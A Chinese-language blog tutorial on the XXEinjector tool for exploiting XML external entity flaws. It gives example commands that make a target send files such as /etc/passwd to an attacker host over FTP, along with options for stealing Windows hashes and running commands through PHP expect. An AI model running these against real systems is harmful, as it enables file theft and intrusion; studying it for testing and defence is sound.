---
title: XXE漏洞利用工具及其资源
date: 2019-03-04 16:02:01
tags: 
	- Tools
	- Payload
	- Cheatsheet
	- XXE
categories:
	- WEB漏洞学习
---

## 一、XXE Payload Cheatsheet

https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection

## 二、XXEinjector工具

### 0x00 XXEinjector概述

XXEinjector 是一款XXE Fuzz漏洞利用工具。

XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。

XXEinjector 可以使用直接检索和带外的方式。

<!-- more -->

XXEinjector 的目录遍历（`--path`）只能用于Java应用程序。其他类型的应用程序只能使用爆破（`--brute`）的方法。

带外方式要求目标主机可以访问我们指定的主机（`--host`），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）

工具地址：https://github.com/enjoiz/XXEinjector

### 0x01 基本重要参数使用方法

`--file`：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用"XXEINJECT"来标记注入点。

> ```
> POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1
> Host: 192.168.199.111
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
> Accept-Encoding: gzip, deflate
> Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 30
> Connection: close
> Upgrade-Insecure-Requests: 1
> 
> xml=XXEINJECT&submit=%E6%8F%90%E4%BA%A4
> ```

`--path`：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数`--brute`。

> `--path=/etc`
>
> `--path=s://test.txt`

`--brute`：该选项用于爆破文件，用于指定包含`文件路径`的字典文件。结果在`brute.log`文件中。

> ```
> s://test.txt
> s://test1.txt
> /etc/passwd
> ```

**工具包含直接和带外两种检索文件的方式。**

**默认是带外方式：**

`--oob=ftp/http/gopher`：带外方式提供ftp(默认)、http、gopher三种协议。

> - ftp协议适用于任意类型WEB程序。
> - http、gopher协议只适用于Java < 1.7的Java WEB应用程序。

`--host`：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。

`--httpport`：`--host`指定的主机监听的WEB服务端口。默认80

`--ftpport`：`--host`指定的主机监听的FTP服务端口。默认21

**直接方式**

`--direct`：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。

**其他参数：**

`--verbose`：显示详细信息，可以显示攻击数据包等。推荐使用。

`--phpfilter`：使用PHP filter对检索文件进行Base64编码。

`--ssl`：用于https站点。

`--expect`：使用 PHP expect 扩展执行系统命令。

`--output`：`--brute`输出结果保留的文件。

### 0x03 使用实例

- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter`

> 结果在Logs\IP\目录下。

- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl`

> 结果在brute.log文件中。

```
--host	    必选项 - our IP address for reverse connections. (--host=192.168.0.2)
--file	    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用"XXEINJECT"来标记的注入点。                      (--file=/tmp/req.txt)

--path	    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)
--brute	    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)
--logger    Log results only. Do not send requests. HTTP logger looks for "p" parameter with             results.
  
--rhost	    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)
--rport	    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)

--oob	    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java < 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java < 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)

--direct	直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)

--cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.

--2ndfile	File containing valid HTTP request used in second order exploitation. 
			(--2ndfile=/tmp/2ndreq.txt)

--phpfilter	使用PHP filter对文件进行Base64编码.
--netdoc    使用netdoc协议而不是file协议。 (Java).
--enumports	Enumerating unfiltered ports for reverse connection. Specify value "all" to     			enumerate all TCP ports. (--enumports=21,22,80,443,445)

--hashes	窃取Windows哈希值.
--expect	使用 PHP expect 扩展执行系统命令. (--expect=ls)
--upload	Uploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)

--xslt	    Tests for XSLT injection.

--ssl	    Use SSL.
--proxy	    Proxy to use. (--proxy=127.0.0.1:8080)
--httpport	   Set custom HTTP port. (--httpport=80)
--ftpport	   Set custom FTP port. (--ftpport=21)
--gopherport   Set custom gopher port. (--gopherport=70)
--jarport	   Set custom port for uploading files using jar. (--jarport=1337)
--xsltport	   Set custom port for XSLT injection test. (--xsltport=1337)

--test	    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。

--urlencode	URL encode injected DTD. This is default for URI.
--nodtd	     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用"--dtd"可以看dtd              文件格式。

--output	爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中
			(--output=/tmp/out.txt)

--timeout	    Timeout for receiving file/directory content. (--timeout=20)
--contimeout	Timeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)

--fast	    Skip asking what to enumerate. Prone to false-positives.
--verbose	    Show verbose messages.
```

## 0x03 XXE学习资源

https://nosec.org/home/detail/2139.html